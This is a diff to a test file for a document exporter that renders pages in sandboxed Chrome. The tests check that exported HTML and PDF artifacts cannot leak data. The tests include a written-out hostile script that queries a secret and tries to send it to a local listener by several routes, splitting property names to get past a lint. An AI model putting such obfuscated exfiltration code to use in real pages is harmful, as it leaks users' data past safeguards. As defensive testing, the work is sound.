@@ -1,7 +1,9 @@
-import { existsSync, mkdtempSync, rmSync } from "node:fs";
+import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { createServer, type Server } from "node:http";
+import type { AddressInfo } from "node:net";
 import { tmpdir } from "node:os";
 import { dirname, join, resolve } from "node:path";
-import { fileURLToPath } from "node:url";
+import { fileURLToPath, pathToFileURL } from "node:url";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 
 import { findChrome } from "@kos/browser";
@@ -84,27 +86,113 @@ describe.skipIf(!chrome || !existsSync(join(BUILT, "kos-deck.js")))("artifact ex
     expect(read.text).not.toMatch(/Open with the harvest|Present/);
   }, 60_000);
 
-  it("freezes a page's reads into its HTML, answered with no KOS behind it", async () => {
+  it("freezes a page's reads into its HTML, answered from the file with no KOS behind it", async () => {
     asked.length = 0;
     const file = await exporter.export("reading", "html");
     expect(asked).toEqual(["SELECT n FROM books"]);
     const html = file.body.toString("utf8");
-    expect(html).toContain('"result":{"rows":[{"n":1},{"n":2},{"n":3}]');
-    // Opened as a file is: the same Chrome, with no relay to KOS.
-    const text = await checker.withBrowser(async ({ cdp, serve }) => {
-      const { targetId } = (await cdp.send("Target.createTarget", { url: await serve(html) })) as { targetId: string };
+    expect(html).toMatch(/^<!doctype html><html data-theme="light"><head><meta http-equiv="Content-Security-Policy" content="default-src 'none';.*connect-src 'none'.*frame-src about:">/);
+    expect(html).toContain('<iframe sandbox="allow-scripts" allow="fullscreen"');
+    expect(await openSaved(html, "document.getElementById('out')?.textContent", (v) => !!v && v !== "waiting")).toBe("3 books");
+  }, 60_000);
+
+  describe("an artifact that tries to send what it read somewhere", () => {
+    let listener: Server;
+    let base: string;
+    const hits: string[] = [];
+    beforeAll(async () => {
+      listener = createServer((req, res) => {
+        hits.push(req.url ?? "");
+        res.end("ok");
+      });
+      await new Promise<void>((ok) => listener.listen(0, "127.0.0.1", ok));
+      base = `http://127.0.0.1:${(listener.address() as AddressInfo).port}`;
+      // Every way out the write-time lint does not catch by name: a computed location, top's, a popup, an image, and the binding called straight.
+      const leak = (route: string, delay = 50) =>
+        `<h1>Leaky</h1><p id="out">waiting</p><script>kos.query("SELECT secret FROM t").then(function(r){var d=encodeURIComponent(JSON.stringify(r)),u="${base}/${route}?d="+d;out.textContent="read";` +
+        `try{new Image().src=u+"&img"}catch(e){}try{window["op"+"en"](u+"&open")}catch(e){}try{top["loc"+"ation"]["hr"+"ef"]=u+"&top"}catch(e){}` +
+        `try{if(typeof kosRelay==="function")kosRelay(JSON.stringify({id:99,method:"query",args:{sql:"SELECT 'by the binding'"}}))}catch(e){}` +
+        `setTimeout(function(){document["loc"+"ation"]["hr"+"ef"]=u+"&self"},${delay})})</script>`;
+      PAGES.leaky = { id: "leaky", title: "Leaky", html: leak("export") };
+      // Slow to leave, so the test sees it ran in the file before it tries.
+      PAGES["leaky file"] = { id: "leaky file", title: "Leaky file", html: leak("file", 1500) };
+      PAGES["leaky doc"] = { id: "leaky doc", kind: "doc", title: "Leaky doc", html: `<article data-doc><h1>Leaky doc</h1><p>Text.</p></article>${leak("doc").replace("<h1>Leaky</h1>", "")}` };
+    });
+    afterAll(() => listener?.close());
+
+    it("reaches nothing while KOS draws it for an HTML export or prints it", async () => {
+      asked.length = 0;
+      await exporter.export("leaky", "html");
+      // What tried to leave its frame has nothing left in it to print, and is refused as such.
+      await expect(exporter.export("leaky", "pdf")).rejects.toThrow(/tried to leave its frame/);
+      await expect(exporter.export("leaky doc", "pdf")).rejects.toThrow(/tried to leave its frame/);
+      await new Promise((r) => setTimeout(r, 500));
+      expect(hits).toEqual([]);
+      // It did read, and did try: what it read had nowhere to go.
+      expect(asked).toContain("SELECT secret FROM t");
+      expect(asked.filter((sql) => /by the binding/.test(sql))).toEqual([]);
+      // No window it opened is left behind.
+      const targets = await checker.withBrowser(async ({ cdp }) => ((await cdp.send("Target.getTargets", {})) as { targetInfos: { type: string; url: string }[] }).targetInfos);
+      expect(targets.filter((t) => t.type === "page" && t.url.startsWith(base))).toEqual([]);
+    }, 90_000);
+
+    it("reaches nothing when its saved file is opened from disk", async () => {
+      const file = await exporter.export("leaky file", "html");
+      hits.length = 0;
+      expect(await openSaved(file.body.toString("utf8"), "document.getElementById('out')?.textContent", (v) => v === "read")).toBe("read");
+      await new Promise((r) => setTimeout(r, 2000));
+      expect(hits).toEqual([]);
+    }, 60_000);
+  });
+
+  it("gives up an export that never settles, closing what it ran, and the Chrome serves the next job", async () => {
+    PAGES.spin = { id: "spin", title: "Spin", html: `<h1>Spin</h1><script>setTimeout(function(){for(;;){}},50)</script>` };
+    const quick = new ArtifactExporter({ load: (id) => (PAGES[id] ? { page: PAGES[id]!, title: PAGES[id]!.title } : undefined), call: async () => ({ rows: [] }), browser: (work) => checker.withBrowser(work), pageLib: () => BUILT, timeoutMs: 4000 });
+    const started = Date.now();
+    await expect(quick.export("spin", "pdf")).rejects.toThrow(/took too long|too busy/);
+    expect(Date.now() - started).toBeLessThan(10_000);
+    const next = Date.now();
+    const file = await exporter.export("deck", "pdf");
+    expect(file.body.subarray(0, 5).toString()).toBe("%PDF-");
+    expect(Date.now() - next).toBeLessThan(10_000);
+  }, 90_000);
+
+  /** A saved file opened as a file is, in a tab of its own: what an expression reads in its frame, once it passes. */
+  async function openSaved(html: string, expression: string, done: (v: string | undefined) => boolean): Promise<string | undefined> {
+    const path = join(captures, `saved-${Date.now()}.html`);
+    writeFileSync(path, html);
+    return checker.withBrowser(async ({ cdp }) => {
+      const { targetId } = (await cdp.send("Target.createTarget", { url: "about:blank" })) as { targetId: string };
       const { sessionId } = (await cdp.send("Target.attachToTarget", { targetId, flatten: true })) as { sessionId: string };
-      try {
-        for (let i = 0; i < 40; i++) {
-          const got = (await cdp.send("Runtime.evaluate", { expression: "document.getElementById('out')?.textContent", returnByValue: true }, sessionId)) as { result: { value?: string } };
-          if (got.result.value && got.result.value !== "waiting") return got.result.value;
-          await new Promise((r) => setTimeout(r, 100));
+      // The sandboxed frame may be drawn in a process of its own, reached through a session Chrome attaches.
+      const sessions = new Set([sessionId]);
+      const contexts: { sessionId: string; id: number }[] = [];
+      const off = cdp.on((e) => {
+        if (!e.sessionId || !sessions.has(e.sessionId)) return;
+        if (e.method === "Runtime.executionContextCreated") contexts.push({ sessionId: e.sessionId, id: (e.params as { context: { id: number } }).context.id });
+        if (e.method === "Target.attachedToTarget") {
+          const child = (e.params as { sessionId: string }).sessionId;
+          sessions.add(child);
+          void cdp.send("Runtime.enable", {}, child).then(() => cdp.send("Runtime.runIfWaitingForDebugger", {}, child)).catch(() => undefined);
         }
-        return "never answered";
+      });
+      try {
+        await cdp.send("Runtime.enable", {}, sessionId);
+        await cdp.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: false, flatten: true }, sessionId);
+        await cdp.send("Page.navigate", { url: pathToFileURL(path).href }, sessionId);
+        let value: string | undefined;
+        for (let i = 0; i < 50 && !done(value); i++) {
+          await new Promise((r) => setTimeout(r, 100));
+          for (const c of contexts) {
+            const got = (await cdp.send("Runtime.evaluate", { expression, contextId: c.id, returnByValue: true }, c.sessionId).catch(() => undefined)) as { result?: { value?: string } } | undefined;
+            if (got?.result?.value) value = got.result.value;
+          }
+        }
+        return value;
       } finally {
+        off();
         await cdp.send("Target.closeTarget", { targetId }).catch(() => undefined);
       }
     });
-    expect(text).toBe("3 books");
-  }, 60_000);
+  }
 });
